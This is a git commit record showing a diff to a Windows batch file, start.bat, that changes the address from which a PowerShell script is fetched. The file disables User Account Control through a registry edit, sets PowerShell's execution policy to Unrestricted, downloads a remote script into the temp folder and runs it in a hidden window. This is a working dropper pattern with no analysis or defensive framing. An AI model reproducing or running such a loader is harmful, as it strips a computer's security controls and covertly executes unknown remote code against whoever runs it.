79500848a8b1389d06edea03e444328947ef8c08
dardaya5544 <88020995+dardaya5544@users.noreply.github.com>
2024-01-24 22:49:38 +0500

    Update start.bat

--- start.bat
+++ start.bat
@@ -7,7 +7,7 @@ echo Skip UAC...
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 echo Download and save the Script to the temp folder
 powershell -Command "Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser"
-powershell -Command "curl https://raw.githubusercontent.com/d3d0n/funwngrok/main/final.ps1 -OutFile $env:temp\final.ps1"
+powershell -Command "curl https://raw.githubusercontent.com/dardaya5544/getscreen/main/final.ps1 -OutFile $env:temp\final.ps1"
 echo Run the Script
 powershell -WindowStyle Hidden -Command "& $env:temp\final.ps1"
 echo Done!
